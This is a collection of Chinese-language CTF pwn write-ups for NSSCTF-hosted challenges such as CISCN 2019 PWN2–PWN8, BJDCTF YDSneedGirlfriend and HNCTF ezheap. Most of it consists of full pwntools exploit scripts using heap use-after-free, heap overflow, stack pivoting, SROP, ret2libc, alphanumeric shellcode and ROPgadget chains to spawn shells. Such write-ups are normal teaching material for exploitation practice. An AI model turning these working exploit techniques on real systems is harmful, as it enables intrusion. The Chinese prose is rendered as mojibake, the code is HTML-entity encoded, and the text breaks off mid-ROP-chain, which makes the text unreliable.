åå†ç”³è¯·ä¸€æ¬¡ï¼Œå®ƒå°±ä¼šæŠŠä¹‹å‰çš„ chunk ç»™æˆ‘ä»¬å¤ç”¨\nä½†æ˜¯ç”±äºæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç¼–è¾‘ chunk0ï¼Œä½†æ˜¯ chunk0 ç°åœ¨è¢« page1 æ‰€è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ edit å†™å…¥ page1 sh å¹¶ show_page å³å¯ getshell\nadd_chunk ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºç”³è¯·äº†ä¸€æ®µ 0x10 å¤§å°çš„å †\n\nfree ä¹‹åè¿™æ®µå †è¢«æ”¾åˆ°äº† tcache é‡Œ\n\nå†æ¬¡ç”³è¯·æ—¶è¿™æ®µå †å°±è¢«å¤ç”¨äº†\n\nä½†æ˜¯å †é‡Œä»€ä¹ˆéƒ½æ²¡æœ‰\n\næŠŠ payload é€è¿›å †ï¼Œæ‹¿åˆ° shell\n\n[NISACTF 2022]ezheap\n\n\nç”³è¯·äº†ä¸¤ä¸ª chunkï¼Œsystem åœ¨äº† 0x8048596ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åˆ©ç”¨ chunk1 çš„æº¢å‡ºï¼Œæº¢å‡ºåˆ° chunk2 ä¸­çš„ 0x8048596ï¼Œå†™å…¥&#x2F;bin&#x2F;shï¼Œå³å¯\n\nfrom pwn import*io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28682)#io=process(&quot;./heap&quot;)io.recvuntil(&quot;Input:\\n&quot;)payload=b&#x27;a&#x27;*(0x16+5)+b&#x27;/bin/sh&#x27;io.sendline(payload)io.interactive()\n\n[BJDCTF 2020]YDSneedGirlfriend\nèœå•ï¼Œå¢åˆ æ”¹æŸ¥ï¼Œå…¸ï¼\nçœ‹çœ‹æ€ä¹ˆå¢ï¼Œ\n\nåˆ é™¤ï¼Œfree ä¹‹åæ²¡æœ‰å°†æŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨ UAF æ¼æ´\n\nprint_girlfriend å‡½æ•°ä¼šè°ƒç”¨ chunk é‡Œçš„ puts è¾“å‡º chunk é‡Œçš„ nameï¼Œå¦‚æœå°†è°ƒç”¨ puts å‡½æ•°çš„åœ°æ–¹è¦†å†™æˆ backdoorï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œ print_girlfriend è°ƒç”¨ puts çš„æ—¶å€™å°±è½¬å»æ‰§è¡Œ backdoor äº†\n\næ‰€ä»¥æˆ‘ä»¬å…ˆç”³è¯·ä¸¤ä¸ª chunkï¼Œä¸º chunk0 å’Œ chunk1ï¼Œç„¶å free æ‰ï¼Œæ­¤æ—¶ tcachebins ä¸­çš„é“¾è¡¨ä¸º chunk1-&gt;chunk0\nï¼ˆæœ‰ wp æ˜¯ fastbin å†…çš„ï¼Œä¼°è®¡æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼‰\n\nç°åœ¨æˆ‘ä»¬å†ç”³è¯·ä¸€æ®µ 0x10 çš„ chunk2ï¼Œè¿™ä¸‹ chunk2 ç”³è¯·åˆ°äº† chunk1 çš„åœ°å€ï¼Œåé¢ç”³è¯·çš„ç”¨æ¥å­˜åå­—çš„ chunk å°±ç”³è¯·åˆ°äº† chunk0 çš„åœ°å€ï¼Œ\n\nç°åœ¨æŠŠ chunk0 ä¸­çš„ puts çš„åœ°å€æ”¹æ‰ï¼Œæ‰§è¡Œ print_girlfriend çš„æ—¶å€™å°±èƒ½æ‹¿åˆ° shell äº†\nfrom pwn import*io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28064)#io=process(&#x27;./girlfriend&#x27;)elf=ELF(&#x27;./girlfriend&#x27;)def add(size,name):    io.sendlineafter(&quot;Your choice :&quot;,&#x27;1&#x27;)    io.sendlineafter(&quot;Her name size is :&quot;,str(size))    io.sendlineafter(&quot;Her name is :&quot;,name)def dele(index):    io.sendlineafter(&quot;Your choice :&quot;,&#x27;2&#x27;)    io.sendlineafter(&quot;Index :&quot;,str(index))def show(index):    io.sendlineafter(&quot;Your choice :&quot;,&#x27;3&#x27;)    io.sendlineafter(&quot;Index :&quot;,str(index))def debug(io):    gdb.attach(io)    pause()#debug(io)backdoor=0x400b9cadd(0x20,&#x27;aaaa&#x27;)add(0x20,&#x27;bbbb&#x27;)dele(0)dele(1)add(0x10,p64(backdoor))show(0)io.interactive()\n\n[HNCTF 2022 WEEK4]ezheap\nä¿æŠ¤å…¨å¼€ï¼Œæ€¥ï¼ä½†æ˜¯å¢åˆ æ”¹æŸ¥ï¼Œå…¸ï¼\n\ndelete æ—  UAF\nadd ä¼šåœ¨ç”¨æˆ·ç”³è¯·çš„å †å—ä¹‹å‰ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º 0x20 çš„å †å—ï¼Œå¹¶ä¼šåœ¨ç”¨æˆ·ç”³è¯·çš„è‡ªå®šä¹‰å¤§å°çš„å †å—çš„ Chunk Header çš„ Prev_Size ä½å­˜æ”¾ puts å‡½æ•°çš„åœ°å€ã€‚\n\nshow å°† Prev_Size çš„åœ°å€å–å‡ºï¼Œä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œç„¶åå–å‡º fd æŒ‡é’ˆï¼Œä½œä¸ºå‚æ•°ã€‚\n\nedit å­˜åœ¨å †æº¢å‡º\n\nåŸç†æ˜¯é€šè¿‡ä¿®æ”¹ puts å‡½æ•°çš„å‚æ•°ï¼ŒåŸæœ¬æ˜¯æ‰“å°æŸä¸ªå †å—çš„å†…å®¹ï¼Œæ›´æ”¹ä¸ºæˆ‘ä»¬åˆ›å»ºçš„å †å—åœ°å€çš„ Headerï¼Œå³å¯æ‰“å°å‡ºæˆ‘ä»¬çš„ puts åœ°å€ã€‚\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)#p = process(&#x27;./ezheap&#x27;)p = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28355)elf = ELF(&#x27;./ezheap&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)def add(idx, size, name = b&#x27;a&#x27;, data = b&#x27;a&#x27;):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))    p.sendlineafter(b&#x27;Size:\\n&#x27;, str(size))    p.sendafter(b&#x27;Name: \\n&#x27;, name)    p.sendafter(b&#x27;Content:\\n&#x27;, data)def free(idx):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;2&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))def show(idx):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;3&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))def edit(idx, size, data):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;4&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))    p.sendlineafter(b&#x27;Size:\\n&#x27;, str(size))    p.send(data)# leak libc_baseadd(0, 0x10)add(1, 0x10)edit(0, 0x31, p64(0)*3 + p64(0x31) + p64(0)*2 + p8(0x30))show(1)libc_base = get_addr() - libc.sym[&#x27;puts&#x27;]# leak heap_baseedit(0, 0x31, p64(0)*3 + p64(0x31) + p64(0)*2 + p8(0x20))show(1)p.recvuntil(b&#x27;\\n&#x27;)heap_base = u64(p.recvuntil(b&#x27;\\x0a&#x27;)[:-1].ljust(8, b&#x27;\\x00&#x27;)) - 0x40# pwnsystem = libc_base + libc.sym[&#x27;system&#x27;]edit(0, 0x48, b&#x27;/bin/sh\\x00&#x27; + p64(0)*2 + p64(0x31) + p64(0)*2 + p64(heap_base + 0x40) + p64(0) + p64(system))show(1)p.interactive()print(&#x27; heap_base -&gt; &#x27;, hex(heap_base))print(&#x27; libc_base -&gt; &#x27;, hex(libc_base))#debug()\n\n\nP | [CISCN 2022 åˆèµ›]login_normal | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯çœ‹ main å‡½æ•°ï¼Œread åæ‰§è¡Œ sub_FFD\n\nè·Ÿè¿› sub_FFD\nunsigned __int64 __fastcall sub_FFD(_BYTE *a1)&#123;  char *sa; // [rsp+8h] [rbp-48h]  char *sb; // [rsp+8h] [rbp-48h]  char *sc; // [rsp+8h] [rbp-48h]  char *sd; // [rsp+8h] [rbp-48h]  char v7; // [rsp+17h] [rbp-39h]  int v8; // [rsp+1Ch] [rbp-34h]  int v9; // [rsp+2Ch] [rbp-24h]  void *dest; // [rsp+30h] [rbp-20h]  char *s1; // [rsp+38h] [rbp-18h]  char *nptr; // [rsp+40h] [rbp-10h]  unsigned __int64 v13; // [rsp+48h] [rbp-8h]  v13 = __readfsqword(0x28u);  memset(qword_202040, 0, sizeof(qword_202040));  v8 = 0;  v7 = 0;  dest = 0LL;  while ( !*a1 || *a1 != 10 &amp;&amp; (*a1 != 13 || a1[1] != 10) )// å…³äºa[0]å’Œa[1]çš„åˆ¤å®šå…³ç³»  &#123;    if ( v8 &lt;= 5 )      qword_202040[2 * v8] = a1;                // å¤„ç†çš„ä½åˆ†åˆ«æ˜¯0ï¼Œ8ï¼Œ16ï¼Œ24ï¼Œ32    sb = strchr(a1, 58);                        // æ‰¾åˆ°å­—ç¬¦&#x27;:&#x27;ä½ç½®    if ( !sb )    &#123;      puts(&quot;error.&quot;);      exit(1);    &#125;    *sb = 0;                                    // å°†æ‰¾åˆ°&#x27;:&#x27;çš„ä½ç½®æ•°å€¼å˜ä¸º0    for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc )// sc=sbçš„ä¸‹ä¸€ä½ï¼Œscæ»¡è¶³åœ¨èŒƒå›´å†…ä¸”ç­‰äºæŒ‡å®šå­—ç¬¦      *sc = 0;                                  // å½“å‰å­—ç¬¦ç½®0    if ( !*sc )                 &#123;      puts(&quot;abort.&quot;);      exit(2);    &#125;    if ( v8 &lt;= 5 )      qword_202040[2 * v8 + 1] = sc;            // (0,8,16,24,32)+1å‡ºæ¥çš„å€¼    sd = strchr(sc, &#x27;\\n&#x27;);                    if ( !sd )    &#123;      puts(&quot;error.&quot;);      exit(3);    &#125;    *sd = 0;                                    // ç½®é›¶    a1 = sd + 1;                                // é¦–ä½ç½®åˆ°sdçš„ä¸‹ä¸€ä½    if ( *a1 == &#x27;\\r&#x27; )                          // å¦‚æœå½“å‰ä½æ˜¯\\rä¸‹ä¸€ä½ç½®0      *a1++ = 0;    s1 = (char *)qword_202040[2 * v8];          // 0,8,16,24,32    nptr = (char *)qword_202040[2 * v8 + 1];      if ( !strcasecmp(s1, &quot;opt&quot;) )             &#123;      if ( v7 )      &#123;                                         // ç¬¬ä¸€æ¬¡opté€€å‡º        puts(&quot;error.&quot;);        exit(5);      &#125;      v7 = atoi(nptr);    &#125;    else    &#123;      if ( strcasecmp(s1, &quot;msg&quot;) )              // æ˜¯å¦æ˜¯msg      &#123;        puts(&quot;error.&quot;);        exit(4);      &#125;      if ( strlen(nptr) &lt;= 1 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      v9 = strlen(nptr) - 1;                   if ( dest )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      dest = calloc(v9 + 8, 1uLL);      if ( v9 &lt;= 0 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      memcpy(dest, nptr, v9);                     &#125;    ++v8;  &#125;  *a1 = 0;  sa = a1 + 1;                                if ( *sa == &#x27;\\n&#x27; )                            // å¦‚æœæ˜¯æ¢è¡Œç¬¦å°±èµ‹å€¼0    *sa = 0;  switch ( v7 )                             &#123;    case 2:      sub_DA8((const char *)dest);      break;    case 3:      sub_EFE((const char *)dest);      break;    case 1:      sub_CBD((const char *)dest);      break;    default:      puts(&quot;error.&quot;);      exit(6);  &#125;  return __readfsqword(0x28u) ^ v13;&#125;\n\nç”±ä¸Šè¿°å¯çŸ¥ï¼Œè¦è¿›è¡Œä¸¤æ¬¡æ ¡éªŒï¼Œåœ¨è¿æ¥ä¹‹åå°±éœ€è¦å…ˆå†™é€šè¿‡æ ¡éªŒæ‰å¯ä»¥è¿›è¡Œåç»­æ“ä½œï¼Œå³ &#39;opt:1\\r\\nmsg:ro0t\\r\\n å’Œ opt:2\\r\\nmsg:ï¼Œä¸”æœ€ç»ˆç»“å°¾å¿…é¡»æ˜¯ \\r\\n\nç»•è¿‡ååˆ°è¾¾ sub_DA8\nunsigned __int64 __fastcall sub_DA8(const char *a1)&#123;  unsigned int v1; // eax  size_t v2; // rax  int i; // [rsp+14h] [rbp-2Ch]  void *dest; // [rsp+18h] [rbp-28h]  unsigned __int64 v6; // [rsp+28h] [rbp-18h]  v6 = __readfsqword(0x28u);  for ( i = 0; i &lt; strlen(a1); ++i )  &#123;    if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 )    &#123;      puts(&quot;oh!&quot;);      exit(-1);    &#125;  &#125;  if ( unk_202028 != 1 )  &#123;    puts(&quot;oh!&quot;);    exit(-1);  &#125;  if ( unk_202024 )  &#123;    v1 = getpagesize();    dest = (void *)(int)mmap((char *)&amp;loc_FFE + 2, v1, 7, 34, 0, 0LL);    v2 = strlen(a1);    memcpy(dest, a1, v2);    ((void (*)(void))dest)();    //shellcodeåˆ©ç”¨è½¬æ¢æ‰§è¡Œ  &#125;  else  &#123;    puts(a1);  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\npush edxpush 0x36363630push esppop ecxxor dword ptr ds:[ecx],esixor esi,dword ptr ds:[ecx]pop eaxpush 0x33333333xor dword ptr ds:[ecx],esiimul esi,dword ptr ds:[ecx],0x33pop eaxpush 0x69push esixor dword ptr ds:[ecx],esidec eaxarpl word ptr ds:[ecx],sipop edxpop eaxpop ecxxor word ptr ds:[ecx+esi*2+0x49],dxdec eaxcmp word ptr ds:[ebx+0x44],bpjno short tested.004780A6xor byte ptr ds:[edx],dhinc espjno short tested.004780ACxor byte ptr ds:[ecx+esi+0x48],aljnz short tested.0047808Ddec ebpxor al,byte ptr ds:[edi+0x30]pop edxxor ch,byte ptr ds:[edi+0x34]dec eaxxor byte ptr ss:[ebp+0x30],dhpush eaxxor dword ptr ds:[esi],esixor byte ptr ds:[edx+0x30],blaaadec edixor byte ptr ds:[edx+0x30],blinc ebxxor dword ptr ds:[eax],esixor byte ptr ds:[ecx+0x35],bhdec edixor eax,dword ptr ds:[edi+0x30]xor dh,byte ptr ds:[eax]inc edxxor ch,byte ptr ds:[esi+0x30]xor byte ptr ss:[esi+0x34],cljno short tested.004780B8outs dx,byte ptr es:[edi]xor dh,byte ptr ds:[eax+esi+0x42]xor byte ptr ds:[eax],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[eax+0x33],clpush ebxxor bh,byte ptr ds:[ecx+0x30]pop ecxxor byte ptr ds:[edi+0x30],clouts dx,byte ptr es:[edi]xor byte ptr ds:[edx+0x30],bhxor dword ptr ds:[ebx],esixor al,0x30xor al,byte ptr fs:[esi+0x34]jns short tested.004780E4push eaxxor dword ptr ds:[ecx],esixor eax,0x306E316Cdec edxxor byte ptr ds:[eax+0x30],chpopadxor byte ptr ds:[edi],dhxor byte ptr ds:[eax+eax],dhadd bh,bhadd byte ptr ds:[eax],aladd bh,bhpop eaxinc ecx\n\nshellcode:&#x2F;bin&#x2F;sh\n#!/usr/bin/env python#coding=utf-8from pwn import*io = remote(ip,port)libc = ELF(&#x27;./libc-2.23.so&#x27;)io.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:1\\r\\nmsg:ro0t\\r\\n&#x27;)    ##ç»•è¿‡1shellcode = &#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;io.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:2\\r\\nmsg:&#x27;+shellcode+&#x27;\\r\\n&#x27;)    #pocio.interactive()\n\n[CISCN 2019 ä¸œå—]PWN2é¢˜ç›®è¯´æ˜æ ˆè¿ç§»\nè§£é¢˜æ€è·¯\n\nread è¯» 0x30ï¼Œä½† s å·²ç» 0x28ï¼Œé•¿åº¦ä¸å¤Ÿï¼Œè€ƒè™‘æ ˆè¿ç§»ã€‚æ‰¾ä¸€ä¸‹ gadget\n\næ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•æŠŠ&#x2F;bin&#x2F;sh å†™å…¥ sï¼Œæ‰¾ä¸€ä¸‹ s çš„åœ°å€\n\nåœ¨ vul å‡½æ•°ä¸Šè¾“ç‚¹å¥‡æ€ªçš„ä¸œè¥¿ï¼Œç„¶åæ‰¾ä¸€ä¸‹ä»–\n\n\nebp å°±å˜æˆå¥‡æ€ªçš„å½¢çŠ¶äº†ï¼ˆå¤§é›¾ï¼‰ï¼Œç®—ä¸€ä¸‹ ebp çš„åç§»\n\nPadding = b&#x27;A&#x27; * 0x27 + b&#x27;C&#x27;io.send(Padding)io.recvuntil(b&#x27;C&#x27;)EBP = u32(io.recv(4))s = EBP - 0x38\n\né¦–å…ˆæ˜¯æ¥æ”¶ EBP åœ°å€çš„ Payloadã€‚\nPrintf ä¼šåœ¨å­—ç¬¦ä¸²ç»“å°¾åŠ ä¸Šä¸€ä¸ªâ€™\\x00â€™ã€‚æˆ‘ä»¬æ‰‹åŠ¨å¡«æ»¡ buf å³å¯è®© printf æ‰“å°å‡º EBP çš„åœ°å€ã€‚\nPayload = (b&#x27;A&#x27; * 0x04) + p32(system) + p32(vul) + p32(s + 0x10) + b&#x27;/bin/sh&#x27;Payload = Payload.ljust(0x28,b&#x27;\\x00&#x27;)Payload += p32(s) + p32(leave_ret)\n\n(bâ€™Aâ€™ * 0x04) æ ˆå¯¹é½\nsystem è°ƒç”¨ system å‡½æ•°\nvul è¿”å›åœ°å€ï¼Œéšä¾¿å¡« é˜²æ­¢ç¨‹åºå´©æºƒ\ns + 0x10 ä¸ºä»€ä¹ˆæ˜¯ 0x10ï¼Œ32 ä½ä¸­åœ°å€é•¿åº¦æ˜¯ 0x04ï¼Œè€Œæ­¤å¤„ Payload ä»ç¬¬ä¸€ä¸ªå¼€å§‹ç®—åˆ°ç¬¬å››ä¸ª,4x4 &#x3D; 16 &#x3D; 0x10ã€‚\nbâ€™&#x2F;bin&#x2F;shâ€™ å°† &#x2F;bin&#x2F;sh å­—ç¬¦ä¸²é€å…¥æ ˆä¸­\nljust åœ¨ payload çš„æœ«å°¾å¡«å……ç©ºå­—èŠ‚ï¼Œå¡«å……çš„å¤§å°ä¸º 0x28-len(Payload)\ns æŒ‡å‘æœ¬æ®µ ROP é“¾çš„åœ°å€ï¼Œè¦†ç›–äº† ebp\nleave_ret å°† eip è¦†ç›–ä¸º ebpï¼Œä¹Ÿå°±æ˜¯åˆšæ‰çš„ sï¼Œæ‰§è¡Œ ROP é“¾\nfrom pwn import * context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;) io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28243)#io = process(&#x27;./CISCN_2019_PWN2&#x27;)elf = ELF(&#x27;./pwn2&#x27;) Padding = b&#x27;A&#x27; * 0x27 + b&#x27;C&#x27;system = elf.plt[&#x27;system&#x27;]vul = elf.sym[&#x27;vul&#x27;]leave_ret = 0x80484b8 io.send(Padding)io.recvuntil(b&#x27;C&#x27;)EBP = u32(io.recv(4))s = EBP - 0x38 Payload = (b&#x27;A&#x27; * 0x04) + p32(system) + p32(vul) + p32(s + 0x10) + b&#x27;/bin/sh&#x27;Payload = Payload.ljust(0x28,b&#x27;\\x00&#x27;)Payload += p32(s) + p32(leave_ret) io.sendline(Payload)io.interactive()\n\n[CISCN 2019 åå—]PWN3é¢˜ç›®è¯´æ˜srop ä¸ä¼šï¼Œè´´ä¸ª exp å…ˆ\nè§£é¢˜æ€è·¯from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)# io = process(&quot;./hnpwn3&quot;)io = remote(&quot;node1.anna.nssctf.cn&quot;,28434)elf = ELF(&quot;./hnpwn3&quot;)syscall = 0x400517gadget = 0x4004DAvuln = 0x4004ED# gdb.attach(io,&quot;b *main&quot;)io.send(b&quot;a&quot;*0x10+p64(vuln))io.recv(0x20)# print()stack = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;)) -0x118print(&quot;stack -&gt; &quot; + hex(stack))frame = SigreturnFrame()frame.rax = 59frame.rdi = stackframe.rip = syscallframe.rsi = 0payload = b&quot;/bin/sh\\x00&quot;*0x2 + p64(gadget) + p64(syscall) + bytes(frame)io.send(payload)io.interactive()\n\n[CISCN 2019 ä¸œåŒ—]PWN2é¢˜ç›®è¯´æ˜strlen+ret2libc\nè§£é¢˜æ€è·¯å…³é”®åœ¨è¿™é‡Œ\n\nstrlen å‡½æ•°ä¼šè¢«\\x00 æˆªæ–­ï¼Œæ‰€ä»¥æˆªæ–­åå†æ¥ä¸Š payload å³å¯é€ æˆæº¢å‡º\n\nç¡®è®¤ä¸€ä¸‹æ²¡æœ‰ canaryï¼Œåé¢ ret2libc å°±è¡Œ\n\nfrom pwn import *import sgtlibccontext.log_level=&#x27;debug&#x27;p=remote(&#x27;node1.anna.nssctf.cn&#x27;,28462)elf=ELF(&#x27;./[CISCN 2019ä¸œåŒ—]PWN2&#x27;)p.recvuntil(b&#x27;choice!&#x27;)p.sendline(str(1))puts_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]ret=0x00000000004006b9pop_rdi=0x0000000000400c83main=elf.symbols[&#x27;main&#x27;]payload=b&#x27;\\x00&#x27;payload+=b&#x27;a&#x27;*0x57payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.recvuntil(&#x27;be encrypted&#x27;)p.sendline(payload)puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=2) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrp.recvuntil(b&#x27;choice!&#x27;)p.sendline(str(1))p.recvuntil(&#x27;be encrypted&#x27;)payload=b&#x27;\\x00&#x27;+b&#x27;a&#x27;*0x57+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(ret)p.sendline(payload)p.interactive()\n\n[CISCN 2019 åä¸­]PWN1é¢˜ç›®è¯´æ˜ret2libc\nè§£é¢˜æ€è·¯from pwn import *import sgtlibcio = remote(&#x27;node2.anna.nssctf.cn&#x27;,28993)elf=ELF(&#x27;./ciscn_2019&#x27;)pop_rdi_ret = 0x400c83puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]ret_addr = 0x4006b9main = 0x400b28io.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload =b&#x27;\\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)io.sendlineafter(&#x27;encrypted\\n&#x27;,payload)puts_addr = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=2) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrio.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload =b&#x27;\\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)io.sendlineafter(&#x27;encrypted\\n&#x27;,payload)io.interactive()\n\n[CISCN 2019 åå—]PWN4é¢˜ç›®è¯´æ˜æ ˆè¿ç§»ï¼ˆè·Ÿä¸Šé¢ä¸œå— pwn2 æ˜¯ä¸€æ ·çš„ï¼Ÿï¼‰\nè§£é¢˜æ€è·¯from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28823)# p=process(&#x27;./hnpwn4&#x27;)elf=ELF(&#x27;./ciscn_2019&#x27;) sys_addr=0x8048400leave_ret=0x080484b8 payload1 = b&#x27;a&#x27;*0x27p.sendlineafter(&#x27;name?\\n&#x27;,payload1)p.recvuntil(&#x27;\\n&#x27;)oldebp = u32(p.recv(4)) payload2 = b&#x27;a&#x27;*4+p32(sys_addr)+p32(0)+p32(oldebp-0x28)+b&#x27;/bin/sh&#x27;payload2 = payload2.ljust(0x28,b&#x27;\\0&#x27;)payload2+=p32(oldebp-0x38)+p32(leave_ret)p.sendlineafter(&#x27;\\n&#x27;,payload2) p.interactive()\n\n[CISCN 2019 ååŒ—]PWN5é¢˜ç›®è¯´æ˜shellcode\nè§£é¢˜æ€è·¯ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡æœ‰\n\næŠŠ shellcode å†™åœ¨ text ä¸Šå†è·³è¿‡å»æ‰§è¡Œå°±å¥½\n\nç»™äº†è¿™ä¹ˆé•¿çš„ç©ºé—´ï¼Œè¿™å¤šæ˜¯ä¸€ä»¶ç¾äº‹å„¿å•Šã€‚ç›´æ¥ç”¨ shellcraft\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28920)shellcode = asm(shellcraft.sh())io.sendlineafter(b&#x27;name&#x27;,shellcode)name = 0x601080payload = b&#x27;a&#x27;*0x28 + p64(name)io.recvuntil(b&#x27;me?\\n&#x27;)io.send(payload)io.interactive()\n\n[CISCN 2019 åå—]PWN8é¢˜ç›®è¯´æ˜è¿™é“é¢˜æ¯”è¾ƒå¥‡å¦™\næˆ‘ä¸æ˜¯å¾ˆæ‡‚è¿™ä¸€æ•´ä¸ªæ˜¯ä»€ä¹ˆç¨‹åº\nè§£é¢˜æ€è·¯ida æ‰“å¼€å…¨éƒ½æ˜¯è¿™ç§ jb å‡½æ•°ï¼Œæ‰€ä»¥é è¿è¡Œæ—¶çš„å­—ç¬¦æ‰¾ä¸»å‡½æ•°ï¼ˆALT+Tï¼‰\n\n\n\næ‰¾åˆ°è¿™é‡Œï¼Œå†è·Ÿä¸€ä¸‹é‡Œé¢å‡ ä¸ªå‡½æ•°\n\nsub_410550 å°±æ˜¯ printf\nsub_449BE0 å°±æ˜¯ä¸€ä¸ª read å‡½æ•°\né‡å¤´æˆåœ¨ sub_400C40ï¼š\n\nå®ƒä¼šæŠŠä¼ å…¥çš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–å†è¿”å›åˆ°â€œä¸»å‡½æ•°â€\n\næ‰€ä»¥æˆ‘ä»¬æ„é€  payload çš„æ—¶å€™è®°å¾—å…ˆå¼‚æˆ–å°±å¥½äº†\nä½†æ˜¯è¿™ä¹ˆå¤šä¸ªå‡½æ•°æ€ä¹ˆæ„é€  ropchain å‘¢\n\næ˜¯é™æ€é“¾æ¥ï¼Œæˆ‘ä»¬å€Ÿç”¨ ROPgadget å®Œæˆ ropchain çš„æ„é€ ï¼š\nROPgadget â€“binary helloworld â€“ropchain\nROP chain generation===========================================================- Step 1 -- Write-what-where gadgets        [+] Gadget found: 0x47f7b1 mov qword ptr [rsi], rax ; ret        [+] Gadget found: 0x4040fe pop rsi ; ret        [+] Gadget found: 0x449b9c pop rax ; ret        [+] Gadget found: 0x444f00 xor rax, rax ; ret- Step 2 -- Init syscall number gadgets        [+] Gadget found: 0x444f00 xor rax, rax ; ret        [+] Gadget found: 0x474c00 add rax, 1 ; ret        [+] Gadget found: 0x474c01 add eax, 1 ; ret- Step 3 -- Init syscall arguments gadgets        [+] Gadget found: 0x4006e6 pop rdi ; ret        [+] Gadget found: 0x4040fe pop rsi ; ret        [+] Gadget found: 0x449bf5 pop rdx ; ret- Step 4 -- Syscall gadget        [+] Gadget found: 0x40139c syscall- Step 5 -- Build the ROP chain#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 